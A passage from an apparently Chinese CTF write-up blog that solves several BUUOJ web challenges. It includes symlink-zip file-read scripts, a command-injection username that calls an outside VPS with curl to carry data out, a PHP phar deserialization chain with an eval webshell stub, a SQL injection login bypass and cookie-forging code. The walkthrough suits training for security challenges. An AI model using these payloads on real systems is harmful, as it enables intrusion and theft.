<p>这里有两种方式</p>
<p><strong>0x00：</strong><br>在 linux 中，<code>/proc/self/cwd/</code>会指向进程的当前目录，那么在不知道 flask 工作目录时，我们可以用<code>/proc/self/cwd/flag/flag.jpg</code>来访问 flag.jpg</p>
<p>命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag&#x2F;flag.jpg qwe</span><br><span class="line">zip -ry qwe.zip qwe</span><br></pre></td></tr></table></figure>

<p><strong>0x01：</strong><br>在 linux 中，<code>/proc/self/environ</code>文件里包含了进程的环境变量，可以从中获取 flask 应用的绝对路径，再通过绝对路径制作软链接来读取 flag.jpg (PS：在浏览器中，我们无法直接看到<code>/proc/self/environ</code>的内容，只需要下载到本地，用 notepad++打开即可)</p>
<p>命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;proc&#x2F;self&#x2F;environ qqq</span><br><span class="line">zip -ry qqq.zip qqq</span><br><span class="line">ln -s &#x2F;ctf&#x2F;hgfjakshgfuasguiasguiaaui&#x2F;myflask&#x2F;flag&#x2F;flag.jpg www</span><br><span class="line">zip -ry [www.zip](http:&#x2F;&#x2F;www.zip) www</span><br></pre></td></tr></table></figure>

<p>最终exp:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;3917cde6-876c-43a8-ae7a-d9351fd1f1ec.node3.buuoj.cn&#x2F;upload&quot;</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &#39;cookie&#39;:&#39;session&#x3D;eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSu2A.SeLyR45y3lQcF1dRjwzQw5Y-3TE&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    files &#x3D; &#123;&#39;file&#39;:open(&#39;E:&#x2F;&#x2F;qwe.zip&#39;,&#39;rb&#39;)&#125;</span><br><span class="line">    data&#x3D;&#123;</span><br><span class="line">        &#39;submit&#39;:&#39;Submit&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    r&#x3D;requests.post(url&#x3D;url,files&#x3D;files,data&#x3D;data,headers&#x3D;headers)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<ul>
<li>非预期解法</li>
</ul>
<p>题目中存在命令执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f&#x3D;request.files[&#39;file&#39;]</span><br><span class="line">path &#x3D; basepath+&#39;&#x2F;upload&#x2F;&#39;+md5_ip+&#39;&#x2F;&#39;+md5_one+&#39;&#x2F;&#39;+session[&#39;username&#39;]+&quot;&#x2F;&quot;</span><br><span class="line">filename &#x3D; f.filename</span><br><span class="line">pathname &#x3D; path+filename</span><br><span class="line">try:</span><br><span class="line">	cmd &#x3D; &quot;unzip -n -d &quot;+path+&quot; &quot;+ pathname</span><br><span class="line">	if cmd.find(&#39;|&#39;) !&#x3D; -1 or cmd.find(&#39;;&#39;) !&#x3D; -1:</span><br><span class="line">		waf()</span><br><span class="line">		return &#39;error&#39;</span><br><span class="line">	os.system(cmd)</span><br></pre></td></tr></table></figure>

<p><code>filename</code>和<code>session[&#39;username&#39;]</code>我们都是可控的，然后参数之间拼接到命令。只是过滤了<code>|</code>和<code>;</code>，但是<code>&amp;</code>和<code>#</code>都没有过滤掉，所以可以构造任意命令执行</p>
<p>可控的两个参数中，<code>filename</code>因为是文件名，不能带有<code>/</code>，所以不好注入</p>
<p>于是就把注入点放在<code>session[&#39;username&#39;]</code></p>
<p>注册用户名：<code>&amp; curl vps:8888 #</code>，得到session后，同样按上面的方法一样修改<code>id:1</code>然后访问<code>/upload</code></p>
<p>利用-d 参数将jpg文件信息带出来，参考：<a href="https://nikoeurus.github.io/2019/12/09/SWPU-ctf/#easy-python" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/12/09/SWPU-ctf/#easy-python</a></p>
<p>贴一下官方wp地址：<a href="https://www.anquanke.com/post/id/194640" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194640</a></p>
<h3 id="0x-06-SWPUCTF-2018-SimplePHP"><a href="#0x-06-SWPUCTF-2018-SimplePHP" class="headerlink" title="0x 06 [SWPUCTF 2018]SimplePHP"></a>0x 06 [SWPUCTF 2018]SimplePHP</h3><ul>
<li><p>考点</p>
<p>phar反序列化</p>
</li>
<li><p>解题过程</p>
</li>
</ul>
<ol>
<li>页面有两个功能，读取文件和上传文件，利用读取文件读取源代码，如下</li>
</ol>
<p>file.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  </span><br><span class="line">include &#39;function.php&#39;; </span><br><span class="line">include &#39;class.php&#39;; </span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;); </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; </span><br><span class="line">if(empty($file)) &#123; </span><br><span class="line">    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2&#x2F;&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">$show &#x3D; new Show(); </span><br><span class="line">if(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source &#x3D; $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; else if (!empty($file))&#123; </span><br><span class="line">    die(&#39;file doesn\&#39;t exists.&#39;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str &#x3D; $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test &#x3D; $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source &#x3D; $file;   &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($key,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key &#x3D; $value;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\.\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#39;hacker!&#39;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line">            $this-&gt;source &#x3D; &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params &#x3D; array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value &#x3D; $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value &#x3D; &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text &#x3D; base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>pop链构造如下：</p>
<blockquote>
<p>1.利用C1e4r类的<code>__destruct()</code>中的<code>echo $this-&gt;test</code><br> 2.触发Show类的<code>__toString()</code><br> 3.利用Show类的<code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source</code><br> 4.触发Test类的<code>__get()</code><br> 5.成功利用<code>file_get()</code>读文件</p>
</blockquote>
<p>exp如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r&#123;</span><br><span class="line">	public $test;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new Test();</span><br><span class="line">$a-&gt;params[&#39;source&#39;] &#x3D;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&#39;;</span><br><span class="line"></span><br><span class="line">$b &#x3D; new Show();</span><br><span class="line">$b-&gt;str[&#39;str&#39;]&#x3D;$a;</span><br><span class="line"></span><br><span class="line">$c &#x3D; new C1e4r();</span><br><span class="line">$c-&gt;str &#x3D; $b;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar &#x3D; new Phar(&#39;phar.phar&#39;); &#x2F;&#x2F;后缀名必须为phar</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(&#39;GIF89a&#39;.&#39;&lt;?php echo 1;eval($_GET[&quot;Smi1e&quot;]);?&gt;&#39;.&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);</span><br><span class="line">$phar -&gt; setMetadata($c); &#x2F;&#x2F;将自定义的meta-data存入manifest</span><br><span class="line">$phar -&gt; addFromString(&#39;test.txt&#39;,&#39;test&#39;);&#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">$phar -&gt; stopBuffering();   &#x2F;&#x2F;签名自动计算</span><br></pre></td></tr></table></figure>

<p>将生成的phar修改后缀为jpg后上传，计算上传后的路径：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename &#x3D; md5(&quot;phar.jpg&quot;.&quot;174.0.222.75&quot;).&quot;.jpg&quot;;</span><br><span class="line">echo $filename;</span><br></pre></td></tr></table></figure>

<p>访问：<code>http://15ad6660-d710-4885-80f1-1341ad6588b6.node3.buuoj.cn/file.php?file=phar:///var/www/html/upload/e961ead23ad245f8859475af4eb77a87.jpg</code>得到base64编码的flag</p>
<p>参考链接：<a href="https://xz.aliyun.com/t/3656#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/3656#toc-14</a></p>
<h3 id="0x-07-SWPU2019-Web6"><a href="#0x-07-SWPU2019-Web6" class="headerlink" title="0x 07 [SWPU2019]Web6"></a>0x 07 [SWPU2019]Web6</h3><ul>
<li><p>考点</p>
<p>SQL注入、session.upload_progress的利用</p>
</li>
<li><p>解题过程</p>
</li>
</ul>
<ol>
<li>首页是登录页面，经过测试发现账号密码分开验证，且没有验证账号密码是否不为空，猜测后台代码逻辑为</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;select * from users where username&#x3D;&#39;$name&#39; and passwd&#x3D;&#39;$pass&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql); </span><br><span class="line">if (mysql_num_rows($query) &#x3D;&#x3D; 1) &#123; </span><br><span class="line">    $key &#x3D; mysql_fetch_array($query);</span><br><span class="line">    if($key[&#39;passwd&#39;] &#x3D;&#x3D; $_POST[&#39;passwd&#39;]) &#123;</span><br></pre></td></tr></table></figure>

<p>这里需要绕过<code>if($key[&#39;passwd&#39;] == $_POST[&#39;passwd&#39;])</code>，使用如下payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1&#39; or &#39;1&#39;&#x3D;&#39;1&#39; group by passwd with rollup having passwd is NULL #</span><br><span class="line">密码为空</span><br></pre></td></tr></table></figure>

<p>这儿with rollup会增加一行，其中passwd为NULL，having passwd is NULL 表示选择我们增加的那一行，即有用户名，密码为空，所以我们登陆时密码为空即可。本地验证如下：</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323195335336.png" alt></p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323200804839.png" alt></p>
<ol start="2">
<li>扫一下目录发现一个<code>wsdl.php</code>,<code>f12</code>可以查看里面的内容，其中出现了很多的关于<code>SoapServer</code>的字段，百度一下是<em>WSDL</em>文件</li>
</ol>
<blockquote>
<p>portType元素<br>       PortType元素定义了Web服务的抽象接口，它可以由一个或者多个operation元素，每个operation元素定义了一个RPC样式或者文档样式的Web服务方法。</p>
<p>operation元素<br>      Operation元素要用一个或者多个messages消息来定义它的输入、输出以及错误。</p>
</blockquote>
<p>尝试调用Get_flag,页面回显不允许的方法，同时我们发现存在File_read方法，发现需要post一个filename来进行文件读取</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200326125825216.png" alt></p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200326130048324.png" alt></p>
<p>尝试根据hint方法回显进行文件读取index.php源代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">include (&quot;encode.php&quot;);</span><br><span class="line">include(&quot;Service.php&quot;);</span><br><span class="line">&#x2F;&#x2F;error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;phpinfo();</span><br><span class="line">$method &#x3D; $_GET[&#39;method&#39;]?$_GET[&#39;method&#39;]:&#39;index&#39;;</span><br><span class="line">&#x2F;&#x2F;echo 1231;</span><br><span class="line">$allow_method &#x3D; array(&quot;File_read&quot;,&quot;login&quot;,&quot;index&quot;,&quot;hint&quot;,&quot;user&quot;,&quot;get_flag&quot;);</span><br><span class="line">if(!in_array($method,$allow_method))</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;not allow method&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if($method&#x3D;&#x3D;&#x3D;&quot;File_read&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    $param &#x3D;$_POST[&#39;filename&#39;];</span><br><span class="line">    $param2&#x3D;null;</span><br><span class="line"></span><br><span class="line">&#125;else</span><br><span class="line">&#123;</span><br><span class="line">    if($method&#x3D;&#x3D;&#x3D;&quot;login&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        $param&#x3D;$_POST[&#39;username&#39;];</span><br><span class="line">        $param2 &#x3D; $_POST[&#39;passwd&#39;];</span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;method can use&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $method;</span><br><span class="line">$newclass &#x3D; new Service();</span><br><span class="line">echo $newclass-&gt;$method($param,$param2);</span><br><span class="line">ob_flush();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>根据源代码提示调用get_flag方法</p>
<p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200326130718753.png" alt></p>
<p>允许admin 127.0.0.1 get_flag 的话猜测是越权加ssrf了</p>
<ol start="3">
<li>先进行越权，查看cookie 然后读文件encode.php 和keyaaaaaaaasdfsaf.txt文件，得到key为<code>flag{this_is_false_flag}</code></li>
</ol>
<p>encode.php源代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function en_crypt($content,$key)&#123;</span><br><span class="line">    $key    &#x3D;    md5($key);</span><br><span class="line">    $h      &#x3D;    0;</span><br><span class="line">    $length    &#x3D;    strlen($content);</span><br><span class="line">    $swpuctf      &#x3D;    strlen($key);</span><br><span class="line">    $varch   &#x3D;    &#39;&#39;;</span><br><span class="line">    for ($j &#x3D; 0; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($h &#x3D;&#x3D; $swpuctf)</span><br><span class="line">        &#123;</span><br><span class="line">            $h &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $varch .&#x3D; $key&#123;$h&#125;;</span><br><span class="line">        </span><br><span class="line">        $h++;</span><br><span class="line">    &#125;</span><br><span class="line">    $swpu  &#x3D;  &#39;&#39;;    </span><br><span class="line">    for ($j &#x3D; 0; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $swpu .&#x3D; chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % 256);</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($swpu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后写出对应的解密函数,解密cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function en_crypt($content,$key)&#123;</span><br><span class="line">    $key    &#x3D;    md5($key);</span><br><span class="line">    $h      &#x3D;    0;</span><br><span class="line">    $length    &#x3D;    strlen($content);</span><br><span class="line">    $swpuctf      &#x3D;    strlen($key);</span><br><span class="line">    $varch   &#x3D;    &#39;&#39;;</span><br><span class="line">    for ($j &#x3D; 0; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($h &#x3D;&#x3D; $swpuctf)</span><br><span class="line">        &#123;</span><br><span class="line">            $h &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $varch .&#x3D; $key&#123;$h&#125;;</span><br><span class="line">        </span><br><span class="line">        $h++;</span><br><span class="line">    &#125;</span><br><span class="line">    $swpu  &#x3D;  &#39;&#39;;    </span><br><span class="line">    for ($j &#x3D; 0; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $swpu .&#x3D; chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % 256);</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($swpu);</span><br><span class="line">&#125;</span><br><span class="line">function decrypt($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $key &#x3D; md5($key);</span><br><span class="line">    $x &#x3D; 0;</span><br><span class="line">    $data &#x3D; base64_decode($data);</span><br><span class="line">    $len &#x3D; strlen($data);</span><br><span class="line">    $l &#x3D; strlen($key);</span><br><span class="line">    $char &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; $len; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($x &#x3D;&#x3D; $l)</span><br><span class="line">        &#123;</span><br><span class="line">            $x &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .&#x3D; substr($key, $x, 1);</span><br><span class="line">        $x++;</span><br><span class="line">    &#125;</span><br><span class="line">    $str &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; $len; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if (ord(substr($data, $i, 1)) &lt; ord(substr($char, $i, 1)))</span><br><span class="line">        &#123;</span><br><span class="line">            $str .&#x3D; chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $str .&#x3D; chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo decrypt(&quot;3J6Roahxag&#x3D;&#x3D;&quot;,&quot;flag&#123;this_is_false_flag&#125;&quot;);</span><br><span class="line">echo en_crypt(&quot;admin:1&quot;,&quot;flag&#123;this_is_false_flag&#125;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>解密得到的cookie为<code>xiaoC:2</code>，根据格式加密admin:1，然后替换cookie,变成admin，读取se.php的源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 